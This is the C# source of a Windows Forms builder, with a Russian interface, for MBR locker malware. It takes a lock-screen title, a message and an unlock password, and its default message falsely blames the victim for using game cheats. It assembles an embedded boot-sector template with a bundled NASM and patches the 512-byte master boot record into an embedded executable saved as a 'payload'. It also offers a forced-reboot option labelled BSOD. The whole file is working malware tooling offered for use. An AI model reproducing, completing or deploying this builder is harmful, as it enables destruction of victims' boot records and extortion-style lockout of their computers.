using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System.Text;
using System.Reflection;

namespace MbrLockerBuilder
{
    public class MainForm : Form
    {
        private TextBox txtTitle;
        private TextBox txtBody;
        private TextBox txtPassword;
        private ComboBox cmbTextColor;
        private ComboBox cmbBgColor;
        private CheckBox chkBSOD;
        private Button btnBuild;
        private PictureBox previewBox;
        private Label lblStatus;
        private SaveFileDialog saveFileDialog;

        public MainForm()
        {
            this.Text = "MBR Locker Builder v4.0 (Fully Autonomous)";
            this.Size = new Size(1000, 750);
            this.BackColor = Color.FromArgb(10, 15, 10);
            this.ForeColor = Color.FromArgb(0, 255, 100);
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.StartPosition = FormStartPosition.CenterScreen;

            this.InitializeComponents();
            this.LoadDefaultValues();
            this.UpdatePreview();
        }

        private void InitializeComponents()
        {
            int y = 20;
            int leftLabel = 20;
            int leftControl = 180;
            int controlWidth = 400;

            Label lblTitle = new Label();
            lblTitle.Text = "ЗАГОЛОВОК:";
            lblTitle.Left = leftLabel;
            lblTitle.Top = y;
            lblTitle.Width = 150;
            lblTitle.ForeColor = Color.FromArgb(0, 255, 100);
            lblTitle.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.Controls.Add(lblTitle);

            this.txtTitle = new TextBox();
            this.txtTitle.Left = leftControl;
            this.txtTitle.Top = y;
            this.txtTitle.Width = controlWidth;
            this.txtTitle.BackColor = Color.FromArgb(20, 25, 20);
            this.txtTitle.ForeColor = Color.FromArgb(0, 255, 100);
            this.txtTitle.Font = new Font("Consolas", 10);
            this.txtTitle.BorderStyle = BorderStyle.FixedSingle;
            this.Controls.Add(this.txtTitle);
            y += 40;

            Label lblBody = new Label();
            lblBody.Text = "ТЕКСТ:";
            lblBody.Left = leftLabel;
            lblBody.Top = y;
            lblBody.Width = 150;
            lblBody.ForeColor = Color.FromArgb(0, 255, 100);
            lblBody.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.Controls.Add(lblBody);

            this.txtBody = new TextBox();
            this.txtBody.Left = leftControl;
            this.txtBody.Top = y;
            this.txtBody.Width = controlWidth;
            this.txtBody.Height = 120;
            this.txtBody.Multiline = true;
            this.txtBody.BackColor = Color.FromArgb(20, 25, 20);
            this.txtBody.ForeColor = Color.FromArgb(0, 255, 100);
            this.txtBody.Font = new Font("Consolas", 10);
            this.txtBody.BorderStyle = BorderStyle.FixedSingle;
            this.Controls.Add(this.txtBody);
            y += 140;

            Label lblPass = new Label();
            lblPass.Text = "ПАРОЛЬ:";
            lblPass.Left = leftLabel;
            lblPass.Top = y;
            lblPass.Width = 150;
            lblPass.ForeColor = Color.FromArgb(0, 255, 100);
            lblPass.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.Controls.Add(lblPass);

            this.txtPassword = new TextBox();
            this.txtPassword.Left = leftControl;
            this.txtPassword.Top = y;
            this.txtPassword.Width = 200;
            this.txtPassword.BackColor = Color.FromArgb(20, 25, 20);
            this.txtPassword.ForeColor = Color.FromArgb(0, 255, 100);
            this.txtPassword.Font = new Font("Consolas", 10);
            this.txtPassword.BorderStyle = BorderStyle.FixedSingle;
            this.Controls.Add(this.txtPassword);
            y += 40;

            Label lblTextColor = new Label();
            lblTextColor.Text = "ЦВЕТ ТЕКСТА:";
            lblTextColor.Left = leftLabel;
            lblTextColor.Top = y;
            lblTextColor.Width = 150;
            lblTextColor.ForeColor = Color.FromArgb(0, 255, 100);
            lblTextColor.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.Controls.Add(lblTextColor);

            this.cmbTextColor = new ComboBox();
            this.cmbTextColor.Left = leftControl;
            this.cmbTextColor.Top = y;
            this.cmbTextColor.Width = 120;
            this.cmbTextColor.BackColor = Color.FromArgb(20, 25, 20);
            this.cmbTextColor.ForeColor = Color.FromArgb(0, 255, 100);
            this.cmbTextColor.DropDownStyle = ComboBoxStyle.DropDownList;
            this.cmbTextColor.Font = new Font("Consolas", 10);
            this.cmbTextColor.Items.AddRange(new object[] { "Lime", "Red", "White", "Cyan", "Yellow", "Magenta" });
            this.cmbTextColor.SelectedIndex = 0;
            this.Controls.Add(this.cmbTextColor);

            Label lblBgColor = new Label();
            lblBgColor.Text = "ФОН:";
            lblBgColor.Left = leftControl + 140;
            lblBgColor.Top = y;
            lblBgColor.Width = 50;
            lblBgColor.ForeColor = Color.FromArgb(0, 255, 100);
            lblBgColor.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.Controls.Add(lblBgColor);

            this.cmbBgColor = new ComboBox();
            this.cmbBgColor.Left = leftControl + 190;
            this.cmbBgColor.Top = y;
            this.cmbBgColor.Width = 120;
            this.cmbBgColor.BackColor = Color.FromArgb(20, 25, 20);
            this.cmbBgColor.ForeColor = Color.FromArgb(0, 255, 100);
            this.cmbBgColor.DropDownStyle = ComboBoxStyle.DropDownList;
            this.cmbBgColor.Font = new Font("Consolas", 10);
            this.cmbBgColor.Items.AddRange(new object[] { "Black", "Blue", "Dark Red", "Dark Green" });
            this.cmbBgColor.SelectedIndex = 0;
            this.Controls.Add(this.cmbBgColor);
            y += 45;

            this.chkBSOD = new CheckBox();
            this.chkBSOD.Text = "ВЫЗВАТЬ BSOD ПОСЛЕ ПЕРЕЗАПИСИ";
            this.chkBSOD.Left = leftControl;
            this.chkBSOD.Top = y;
            this.chkBSOD.Width = 350;
            this.chkBSOD.ForeColor = Color.FromArgb(0, 255, 100);
            this.chkBSOD.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.chkBSOD.CheckAlign = ContentAlignment.MiddleLeft;
            this.Controls.Add(this.chkBSOD);
            y += 50;

            Label lblPreview = new Label();
            lblPreview.Text = "ПРЕДПРОСМОТР:";
            lblPreview.Left = leftLabel;
            lblPreview.Top = y;
            lblPreview.Width = 150;
            lblPreview.ForeColor = Color.FromArgb(0, 255, 100);
            lblPreview.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.Controls.Add(lblPreview);
            y += 30;

            this.previewBox = new PictureBox();
            this.previewBox.Left = leftControl;
            this.previewBox.Top = y;
            this.previewBox.Width = 640;
            this.previewBox.Height = 200;
            this.previewBox.BackColor = Color.Black;
            this.previewBox.BorderStyle = BorderStyle.FixedSingle;
            this.previewBox.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Controls.Add(this.previewBox);
            y += 220;

            this.btnBuild = new Button();
            this.btnBuild.Text = "СОБРАТЬ PAYLOAD";
            this.btnBuild.Left = leftControl;
            this.btnBuild.Top = y;
            this.btnBuild.Width = 250;
            this.btnBuild.Height = 45;
            this.btnBuild.BackColor = Color.FromArgb(0, 60, 0);
            this.btnBuild.ForeColor = Color.FromArgb(0, 255, 100);
            this.btnBuild.FlatStyle = FlatStyle.Flat;
            this.btnBuild.Font = new Font("Consolas", 12, FontStyle.Bold);
            this.btnBuild.FlatAppearance.BorderColor = Color.FromArgb(0, 255, 100);
            this.btnBuild.Click += new EventHandler(this.BtnBuild_Click);
            this.Controls.Add(this.btnBuild);

            this.lblStatus = new Label();
            this.lblStatus.Text = "Готов (все ресурсы встроены)";
            this.lblStatus.Left = leftControl + 270;
            this.lblStatus.Top = y + 10;
            this.lblStatus.Width = 400;
            this.lblStatus.ForeColor = Color.FromArgb(0, 200, 100);
            this.lblStatus.Font = new Font("Consolas", 10);
            this.Controls.Add(this.lblStatus);

            this.txtTitle.TextChanged += new EventHandler(this.OnTextChanged);
            this.txtBody.TextChanged += new EventHandler(this.OnTextChanged);
            this.txtPassword.TextChanged += new EventHandler(this.OnTextChanged);
            this.cmbTextColor.SelectedIndexChanged += new EventHandler(this.OnTextChanged);
            this.cmbBgColor.SelectedIndexChanged += new EventHandler(this.OnTextChanged);

            this.saveFileDialog = new SaveFileDialog();
        }

        private void LoadDefaultValues()
        {
            this.txtTitle.Text = "КОМПЬЮТЕР ЗАБЛОКИРОВАН!";
            this.txtBody.Text = "Ваш компьютер заблокирован за установку и использование" + Environment.NewLine +
                              "чит ПО в играх, и за это вы были наказаны." + Environment.NewLine + Environment.NewLine +
                              "Для разблокировки введите пароль:";
            this.txtPassword.Text = "48284dkf8";
        }

        private void OnTextChanged(object sender, EventArgs e)
        {
            this.UpdatePreview();
        }

        private void UpdatePreview()
        {
            if (this.previewBox == null) return;

            Bitmap bmp = new Bitmap(640, 200);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                Color bgColor = Color.Black;
                switch (this.cmbBgColor.SelectedIndex)
                {
                    case 0: bgColor = Color.Black; break;
                    case 1: bgColor = Color.DarkBlue; break;
                    case 2: bgColor = Color.Maroon; break;
                    case 3: bgColor = Color.DarkGreen; break;
                }
                g.Clear(bgColor);

                g.DrawRectangle(new Pen(Color.FromArgb(0, 255, 100), 2), 5, 5, 630, 190);

                Color fgColor = Color.Lime;
                switch (this.cmbTextColor.SelectedIndex)
                {
                    case 0: fgColor = Color.Lime; break;
                    case 1: fgColor = Color.Red; break;
                    case 2: fgColor = Color.White; break;
                    case 3: fgColor = Color.Cyan; break;
                    case 4: fgColor = Color.Yellow; break;
                    case 5: fgColor = Color.Magenta; break;
                }

                using (Brush brush = new SolidBrush(fgColor))
                {
                    string title = this.txtTitle.Text.Trim();
                    if (string.IsNullOrEmpty(title)) title = "[LOCKED]";
                    SizeF titleSize = g.MeasureString(title, new Font("Consolas", 16, FontStyle.Bold));
                    g.DrawString(title, new Font("Consolas", 16, FontStyle.Bold), brush,
                        (640 - titleSize.Width) / 2, 15);

                    g.DrawLine(new Pen(fgColor, 1), 20, 45, 620, 45);

                    string body = this.txtBody.Text.Trim();
                    if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
                    string[] lines = body.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
                    int lineY = 60;
                    foreach (string line in lines)
                    {
                        g.DrawString(line.Trim(), new Font("Consolas", 10), brush, 20, lineY);
                        lineY += 20;
                    }

                    g.DrawString("Password: ", new Font("Consolas", 12, FontStyle.Bold), brush, 20, 165);
                    string pass = this.txtPassword.Text;
                    string stars = new string('*', Math.Min(pass.Length, 20));
                    g.DrawString(stars, new Font("Consolas", 12, FontStyle.Bold), brush, 145, 165);
                }
            }
            this.previewBox.Image = bmp;
        }

        private void BtnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                this.lblStatus.Text = "1/6 Извлечение ресурсов...";
                Application.DoEvents();

                // Извлекаем NASM из ресурсов
                string nasmPath = this.ExtractResource("MbrLockerBuilder.Resources.nasm.exe", "nasm.exe");
                if (string.IsNullOrEmpty(nasmPath))
                {
                    throw new Exception("Не удалось извлечь nasm.exe из ресурсов!");
                }

                this.lblStatus.Text = "2/6 Генерация ASM...";
                Application.DoEvents();

                string asmCode = this.GenerateAsmFromResource();
                string asmPath = Path.Combine(Path.GetTempPath(), "locker.asm");
                File.WriteAllText(asmPath, asmCode, Encoding.ASCII);

                this.lblStatus.Text = "3/6 Компиляция NASM...";
                Application.DoEvents();

                string binPath = Path.Combine(Path.GetTempPath(), "locker.bin");
                Process nasm = new Process();
                nasm.StartInfo.FileName = nasmPath;
                nasm.StartInfo.Arguments = $"-f bin -o \"{binPath}\" \"{asmPath}\"";
                nasm.StartInfo.UseShellExecute = false;
                nasm.StartInfo.RedirectStandardOutput = true;
                nasm.StartInfo.RedirectStandardError = true;
                nasm.StartInfo.CreateNoWindow = true;
                nasm.Start();
                nasm.WaitForExit();

                if (nasm.ExitCode != 0)
                {
                    string error = nasm.StandardError.ReadToEnd();
                    throw new Exception("NASM Error: " + error);
                }

                this.lblStatus.Text = "4/6 Чтение бинарного файла...";
                Application.DoEvents();

                byte[] mbrBytes = File.ReadAllBytes(binPath);
                if (mbrBytes.Length != 512)
                {
                    throw new Exception("Invalid MBR size: " + mbrBytes.Length + " bytes");
                }

                this.lblStatus.Text = "5/6 Конвертация в HEX...";
                Application.DoEvents();

                string hex = BitConverter.ToString(mbrBytes).Replace("-", "");

                this.lblStatus.Text = "6/6 Патчинг шаблона...";
                Application.DoEvents();

                // Извлекаем template.exe из ресурсов
                byte[] templateBytes = this.ExtractResourceBytes("MbrLockerBuilder.Resources.template.exe");
                if (templateBytes == null)
                {
                    throw new Exception("Не удалось извлечь template.exe из ресурсов!");
                }

                byte[] payloadBytes = this.PatchTemplate(templateBytes, hex);

                this.saveFileDialog.Title = "Сохранить Payload EXE";
                this.saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (this.saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllBytes(this.saveFileDialog.FileName, payloadBytes);
                    this.lblStatus.Text = "Готово: " + Path.GetFileName(this.saveFileDialog.FileName);
                    
                    MessageBox.Show("Payload успешно создан!\n\n" +
                        "Размер: " + payloadBytes.Length + " байт\n" +
                        "Путь: " + this.saveFileDialog.FileName + "\n\n" +
                        "MBR HEX (первые 64 байта):\n" + hex.Substring(0, Math.Min(128, hex.Length)),
                        "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    this.lblStatus.Text = "Отменено";
                }

                try { File.Delete(asmPath); } catch { }
                try { File.Delete(binPath); } catch { }
                try { File.Delete(nasmPath); } catch { }
            }
            catch (Exception ex)
            {
                this.lblStatus.Text = "Ошибка: " + ex.Message;
                MessageBox.Show("Ошибка сборки:\n" + ex.Message,
                    "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string ExtractResource(string resourceName, string fileName)
        {
            try
            {
                string tempPath = Path.Combine(Path.GetTempPath(), fileName);
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {
                    if (stream == null)
                    {
                        throw new Exception($"Ресурс {resourceName} не найден!");
                    }
                    using (FileStream fs = new FileStream(tempPath, FileMode.Create, FileAccess.Write))
                    {
                        stream.CopyTo(fs);
                    }
                }
                return tempPath;
            }
            catch (Exception ex)
            {
                this.lblStatus.Text = "Ошибка извлечения: " + ex.Message;
                return null;
            }
        }

        private byte[] ExtractResourceBytes(string resourceName)
        {
            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {
                    if (stream == null)
                    {
                        throw new Exception($"Ресурс {resourceName} не найден!");
                    }
                    using (MemoryStream ms = new MemoryStream())
                    {
                        stream.CopyTo(ms);
                        return ms.ToArray();
                    }
                }
            }
            catch (Exception ex)
            {
                this.lblStatus.Text = "Ошибка извлечения: " + ex.Message;
                return null;
            }
        }

        private byte[] PatchTemplate(byte[] templateBytes, string mbrHex)
        {
            byte[] marker = Encoding.ASCII.GetBytes("{MBR_DATA}");
            int markerPos = this.FindPattern(templateBytes, marker);

            if (markerPos == -1)
            {
                throw new Exception("Маркер {MBR_DATA} не найден в шаблоне!");
            }

            byte[] result = new byte[templateBytes.Length - marker.Length + mbrHex.Length];
            
            Array.Copy(templateBytes, 0, result, 0, markerPos);
            
            byte[] hexBytes = Encoding.ASCII.GetBytes(mbrHex);
            Array.Copy(hexBytes, 0, result, markerPos, hexBytes.Length);
            
            int afterMarker = markerPos + marker.Length;
            int remaining = templateBytes.Length - afterMarker;
            Array.Copy(templateBytes, afterMarker, result, markerPos + hexBytes.Length, remaining);

            return result;
        }

        private int FindPattern(byte[] data, byte[] pattern)
        {
            for (int i = 0; i <= data.Length - pattern.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found) return i;
            }
            return -1;
        }

        private string GenerateAsmFromResource()
        {
            string template;
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.locker.asm"))
            {
                if (stream == null)
                {
                    throw new Exception("Ресурс locker.asm не найден!");
                }
                using (StreamReader reader = new StreamReader(stream))
                {
                    template = reader.ReadToEnd();
                }
            }

            string title = this.txtTitle.Text.Trim();
            string body = this.txtBody.Text.Trim().Replace("\r\n", "\\r\\n").Replace("\n", "\\r\\n");
            string password = this.txtPassword.Text.Trim();

            if (string.IsNullOrEmpty(title)) title = "LOCKED";
            if (string.IsNullOrEmpty(password)) password = "admin";
            if (string.IsNullOrEmpty(body)) body = "Computer is locked.";

            string textColor = "0A";
            switch (this.cmbTextColor.SelectedIndex)
            {
                case 0: textColor = "0A"; break;
                case 1: textColor = "0C"; break;
                case 2: textColor = "0F"; break;
                case 3: textColor = "0B"; break;
                case 4: textColor = "0E"; break;
                case 5: textColor = "0D"; break;
            }

            string bgColor = "00";
            switch (this.cmbBgColor.SelectedIndex)
            {
                case 0: bgColor = "00"; break;
                case 1: bgColor = "10"; break;
                case 2: bgColor = "40"; break;
                case 3: bgColor = "20"; break;
            }

            bool enableBSOD = this.chkBSOD.Checked;

            template = template.Replace("{TITLE}", title);
            template = template.Replace("{BODY}", body);
            template = template.Replace("{PASSWORD}", password);
            template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
            template = template.Replace("mov ax, 0x0A00", "mov ax, 0x" + textColor + "00");

            if (enableBSOD)
            {
                template = template.Replace("jmp hang", "int 0x19");
            }

            return template;
        }
    }
}
